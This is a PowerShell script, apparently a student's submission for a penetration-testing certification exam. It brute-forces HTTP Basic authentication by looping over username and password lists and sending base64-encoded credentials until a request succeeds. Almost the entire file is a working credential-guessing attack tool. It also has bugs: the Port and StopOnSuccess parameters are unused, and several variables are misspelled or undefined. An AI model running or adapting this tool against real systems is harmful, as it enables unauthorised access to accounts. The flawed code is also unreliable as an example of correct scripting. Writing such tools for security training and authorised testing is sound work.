function bruteforce-web
{ 
<#
.SYNOPSIS
A cmdlet to bruteforce basix authontcation .
.DESCRIPTION
This script checks if the user & Password are right or no while proccecing lists of users and passswords.
.PARAMETER Hostname
the ling for the web server that hosted basic authantcation .
.PARAMETER UsernameList
list of username .
.PARAMETER PasswordList
list of passwords .
.PARAMETER Port
the port the server using default is 80.
.PARAMETER StopOnSuccess
stop process if the code if there are sucssede.
.PARAMETER Protocol
the protocole web server using .

.EXAMPLE
PS C:\> . .\bruteforce-web.ps1
PS C:\> bruteforce-web -hostname www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx -usernamelist c:\user.txt -passwordlist c:\passwords.txt
.
.LINK
www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx
.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3270
#>

[CmdletBinding()] Param(
  
    [Parameter(Mandatory = $true)]
    [Alias("host", "IPAddress")]
    [String]
    $Hostname,
    
    [Parameter(Mandatory = $true)]
    [String]
    $UsernameList,
    
    [Parameter(Mandatory = $true)]
    [String]
    $PasswordList,
    
    [Parameter(Mandatory = $false)]
    [String]
    $Port = "80",
    
    [Parameter(Mandatory = $false)]
    [String]
    $StopOnSuccess = "True",
    
    [Parameter(Mandatory = $false)]
    [String]
    $Protocol = "http"
  
  )
  # buulding the request parameters
  $URLReq = $Protocol + "://" + $Hostname + "/"
  # taking the content of the user list and pass list
  $usernamess = Get-Content $UsernameList
  $passwordss = Get-Content $PasswordList
# first loop fro usernames
  :Loop1 foreach ($username in $usernamess)
  { # second loop for passwords
      foreach ($password in $passwordss)
      {
          
             

          try {
              $url 
              $messge = "#traying $userneam : $password "
              $messge
              # pairing the creds to encode them 
              $pair = "$($username):$($password)"
              # encode the creds to send it to the web server
              $encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))
             # prepare the parameter for the request 
              $basicAuthValue = "Basic $encodedCreds"
              $Headers = @{
                Authorization = $basicAuthValue
            }
            # sending the request 
            Invoke-WebRequest -Uri $URLReq -Headers $Headers
            $success = $true
            if ($success -eq $true) 
            # chicking if the creds works 
            {
                $message = "[*]Match found! $Username : $Password"
                $message
                $content

                break Loop1
                
            }

          }
          catch {
            $success = $false
            $message = $error[0].ToString()
            $message
          }
            }
  }
}
